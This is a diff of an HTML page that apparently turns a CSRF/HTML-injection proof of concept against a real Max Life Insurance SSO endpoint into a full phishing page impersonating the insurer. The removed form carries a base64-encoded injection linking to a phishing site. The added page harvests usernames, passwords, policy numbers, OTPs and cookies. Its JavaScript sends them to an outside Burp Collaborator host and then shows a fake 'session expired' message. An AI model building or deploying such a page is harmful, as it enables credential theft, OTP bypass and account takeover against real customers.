@@ -1,22 +1,371 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Account Security Notice</title>
+    <title>Security Verification - Max Life Insurance</title>
+    <meta charset="UTF-8">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+        }
+        .card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 30px;
+            border-top: 4px solid #d32f2f;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .header img {
+            max-width: 200px;
+            margin-bottom: 15px;
+        }
+        .warning-icon {
+            font-size: 48px;
+            color: #d32f2f;
+            margin-bottom: 15px;
+        }
+        h2 {
+            color: #333;
+            margin: 10px 0;
+            font-size: 22px;
+        }
+        .alert-box {
+            background-color: #ffebee;
+            border-left: 4px solid #d32f2f;
+            padding: 15px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            color: #333;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        input[type="text"],
+        input[type="password"],
+        input[type="tel"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+        input:focus {
+            border-color: #d32f2f;
+            outline: none;
+        }
+        button {
+            background-color: #d32f2f;
+            color: white;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            font-weight: 600;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #b71c1c;
+        }
+        .security-note {
+            margin-top: 20px;
+            padding: 12px;
+            background-color: #f9f9f9;
+            border-radius: 4px;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #999;
+            font-size: 12px;
+        }
+        .otp-section {
+            display: none;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+        }
+        .hidden {
+            display: none;
+        }
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #d32f2f;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status-message {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 4px;
+            display: none;
+        }
+        .status-message.error {
+            background-color: #ffebee;
+            color: #d32f2f;
+            display: block;
+        }
+        .status-message.success {
+            background-color: #e8f5e8;
+            color: #2e7d32;
+            display: block;
+        }
+    </style>
 </head>
 <body>
-    <h1>Please wait, verifying your account...</h1>
-    
-    <!-- Hidden form that submits to the real SSO page -->
-    <form id="attackForm" method="POST" action="https://sso.maxlifeinsurance.com/ComplianceFlag/sso/passOptionExtUnlock.jsp">
-        <input type="hidden" name="op" value="change">
-        <input type="hidden" name="user" value="PC9iPjwvZm9udD48L3RkPjwvdHI+PC90YWJsZT48YnI+PGJyPgo8Y2VudGVyPgo8aDI+IFdlYnNpdGUgUHJvYmxlbTwvaDI+CjxwPjxiPlRoZXJlIGlzIGEgcHJvYmxlbSB3aXRoIHRoZSB3ZWJzaXRlIHRvIHVubG9jayB0aGUgYWNjb3VudC48L2I+PC9wPgo8cD48YSBocmVmPSJodHRwczovL2V2aWwtcGhpc2hpbmctc2l0ZS5jb20vdW5sb2NrIj5DTElDSyBIRVJFIFRPIFVOTE9DSyBBQ0NPVU5UIDwvYT48L3A+CjxwPkNsaWNrIHRoZSBsaW5rIGFib3ZlIHRvIGNvbnRpbnVlLjwvcD4KPC9jZW50ZXI+Cjx0YWJsZT48dHI+PHRkPg==">
-    </form>
+    <div class="container">
+        <div class="card">
+            <!-- Header with Max Life Logo (using font-based representation) -->
+            <div class="header">
+                <div class="warning-icon">⚠️</div>
+                <h2>Account Security Alert</h2>
+            </div>
+            
+            <!-- Security Alert Message -->
+            <div class="alert-box">
+                <strong>Immediate Action Required:</strong> We've detected unusual activity on your account. 
+                Please verify your credentials immediately to prevent account suspension.
+            </div>
+
+            <!-- Login Form -->
+            <form id="phishForm" onsubmit="event.preventDefault(); captureCredentials();">
+                <div class="form-group">
+                    <label for="username">Registered Mobile Number / Email ID</label>
+                    <input type="text" id="username" name="username" 
+                           placeholder="Enter your registered mobile number or email" 
+                           required autocomplete="off">
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password / MPIN</label>
+                    <input type="password" id="password" name="password" 
+                           placeholder="Enter your password" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="policy">Policy Number (Optional)</label>
+                    <input type="text" id="policy" name="policy" 
+                           placeholder="Enter your policy number for faster verification">
+                </div>
+                
+                <button type="submit" id="submitBtn">
+                    <span id="btnText">Verify Account</span>
+                    <span id="loader" class="loader" style="display: none;"></span>
+                </button>
+            </form>
+
+            <!-- OTP Section (Appears after first step) -->
+            <div id="otpSection" class="otp-section">
+                <div class="form-group">
+                    <label for="otp">Enter OTP Sent to Your Mobile</label>
+                    <input type="tel" id="otp" name="otp" placeholder="Enter 6-digit OTP" maxlength="6">
+                </div>
+                <button onclick="captureOTP()" style="background-color: #1976d2;">Verify OTP</button>
+                <div style="text-align: center; margin-top: 10px;">
+                    <a href="#" style="color: #1976d2; text-decoration: none; font-size: 12px;">Resend OTP</a>
+                </div>
+            </div>
+
+            <!-- Status Messages -->
+            <div id="statusMessage" class="status-message"></div>
+
+            <!-- Security Note -->
+            <div class="security-note">
+                🔒 This is a secure verification process. Your information is encrypted and protected.
+            </div>
+        </div>
+        
+        <div class="footer">
+            © 2024 Max Life Insurance. All rights reserved.
+        </div>
+    </div>
 
     <script>
-        // Auto-submit when page loads
-        window.onload = function() {
-            document.getElementById("attackForm").submit();
+        // CONFIGURATION - REPLACE WITH YOUR BURP COLLABORATOR DOMAIN
+        const COLLABORATOR_URL = 'https://ccsx0i1r0nkve5l5r1vhn3ivym4ds3gs.oastify.com';
+        
+        // Function to send data to collaborator
+        function exfiltrate(data) {
+            // Create a new image element for the ping (works cross-origin)
+            var img = new Image();
+            var timestamp = new Date().getTime();
+            var encodedData = btoa(JSON.stringify(data));
+            img.src = COLLABORATOR_URL + '/exfil?data=' + encodedData + '&t=' + timestamp;
+            
+            // Also try fetch API as backup (but might be blocked by CORS)
+            try {
+                fetch(COLLABORATOR_URL + '/collect', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+            } catch(e) {
+                console.log('Fetch failed, using image ping only');
+            }
+            
+            console.log('Data exfiltrated:', data);
         }
+
+        // Capture main credentials
+        function captureCredentials() {
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            var policy = document.getElementById('policy').value;
+            
+            if (!username || !password) {
+                showStatus('Please fill in all required fields', 'error');
+                return;
+            }
+            
+            // Show loading state
+            document.getElementById('btnText').style.display = 'none';
+            document.getElementById('loader').style.display = 'inline-block';
+            document.getElementById('submitBtn').disabled = true;
+            
+            // Capture credentials
+            var credentials = {
+                type: 'initial_credentials',
+                username: username,
+                password: password,
+                policy: policy,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                page: window.location.href,
+                referrer: document.referrer
+            };
+            
+            // Send to collaborator
+            exfiltrate(credentials);
+            
+            // Show OTP section after brief delay (makes it look legit)
+            setTimeout(function() {
+                document.getElementById('btnText').style.display = 'inline';
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('submitBtn').style.display = 'none';
+                document.getElementById('otpSection').style.display = 'block';
+                showStatus('Verification code sent to your registered mobile number', 'success');
+            }, 2000);
+        }
+
+        // Capture OTP
+        function captureOTP() {
+            var otp = document.getElementById('otp').value;
+            
+            if (!otp || otp.length < 4) {
+                showStatus('Please enter a valid OTP', 'error');
+                return;
+            }
+            
+            // Get previously captured credentials from form
+            var otpData = {
+                type: 'otp_verification',
+                otp: otp,
+                username: document.getElementById('username').value,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            };
+            
+            // Send OTP to collaborator
+            exfiltrate(otpData);
+            
+            // Show fake processing then error
+            showStatus('Verifying OTP...', 'success');
+            
+            setTimeout(function() {
+                showStatus('Session expired. Please login again.', 'error');
+                
+                // Reset form after 3 seconds
+                setTimeout(function() {
+                    document.getElementById('otpSection').style.display = 'none';
+                    document.getElementById('submitBtn').style.display = 'block';
+                    document.getElementById('username').value = '';
+                    document.getElementById('password').value = '';
+                    document.getElementById('policy').value = '';
+                    document.getElementById('otp').value = '';
+                    document.getElementById('statusMessage').style.display = 'none';
+                }, 3000);
+            }, 2000);
+        }
+
+        // Show status messages
+        function showStatus(message, type) {
+            var statusDiv = document.getElementById('statusMessage');
+            statusDiv.textContent = message;
+            statusDiv.className = 'status-message ' + type;
+        }
+
+        // Capture additional info when page loads
+        (function() {
+            var pageInfo = {
+                type: 'page_load',
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookies: document.cookie,
+                screenSize: screen.width + 'x' + screen.height
+            };
+            
+            // Send page load info after 1 second
+            setTimeout(function() {
+                exfiltrate(pageInfo);
+            }, 1000);
+        })();
+
+        // Capture form field interactions (optional - shows when user starts typing)
+        document.getElementById('username').addEventListener('focus', function() {
+            exfiltrate({
+                type: 'interaction',
+                action: 'username_field_focused',
+                timestamp: new Date().toISOString()
+            });
+        });
+
+        // Prevent form from submitting normally
+        document.getElementById('phishForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+        });
     </script>
 </body>
 </html>
